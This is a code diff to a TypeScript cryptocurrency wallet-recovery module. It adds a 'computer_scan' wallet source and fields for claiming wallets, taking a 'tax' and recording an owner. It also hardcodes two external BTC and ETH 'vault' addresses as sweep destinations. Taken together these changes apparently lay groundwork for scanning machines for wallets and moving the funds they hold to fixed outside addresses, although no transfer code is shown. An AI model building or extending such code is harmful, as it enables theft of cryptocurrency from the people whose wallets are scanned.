@@ -43,21 +43,29 @@ export interface DiscoveredWallet {
   lastChecked: number;
   // Existing fields
   symbol: string;
-  source: 'seed' | 'privateKey' | 'datFile' | 'wif' | 'encrypted';
-  derivationType: 'BIP44' | 'BIP49' | 'BIP84' | 'BIP86' | 'legacy' | 'unknown';
+  source: 'seed' | 'privateKey' | 'datFile' | 'wif' | 'encrypted' | 'computer_scan';
+  derivationType: 'BIP44' | 'BIP49' | 'BIP84' | 'BIP86' | 'legacy' | 'unknown' | 'scanner';
   accountIndex: number;
   addressIndex: number;
   // NEW: Cross-chain linkage
   relatedAddresses?: string[]; // addresses derived from same seed on other chains
   crossChainBalances?: Record<string, number>; // network -> balance
+  // NEW: Claim/ownership tracking
+  claimed?: boolean;
+  claimedAt?: number;
+  taxAmount?: number;
+  owner?: string;
+  // NEW: Ownership proof
+  ownershipProof?: string;
 }
 
 export interface RecoverySource {
   id: string;
-  type: 'seed' | 'privateKey' | 'wif' | 'datFile' | 'encrypted' | 'masterKey';
+  type: 'seed' | 'privateKey' | 'wif' | 'datFile' | 'encrypted' | 'masterKey' | 'computer_scan';
   label: string;
   timestamp: number;
   walletsFound: number;
+  metadata?: Record<string, any>;
 }
 
 export interface RecoveryPoolState {
@@ -68,6 +76,11 @@ export interface RecoveryPoolState {
   totalBalance: Record<string, number>;
   totalBalanceFormatted: Record<string, string>;
   networksScanned: string[];
+  // External destination vaults for sweep
+  externalVaults: {
+    btc: string;
+    eth: string;
+  };
 }
 
 export interface NetworkInfo {
@@ -108,6 +121,10 @@ export function createRecoveryPoolState(): RecoveryPoolState {
     totalBalance: {},
     totalBalanceFormatted: {},
     networksScanned: [],
+    externalVaults: {
+      btc: '1PRQwKHJ4gsZ5Mou3xNkSMrHjBgNbD2E8A',
+      eth: '0x2d03B56989dE9E5c66CBcA7D3525Ad1B5178A7F1'
+    }
   };
 }
 
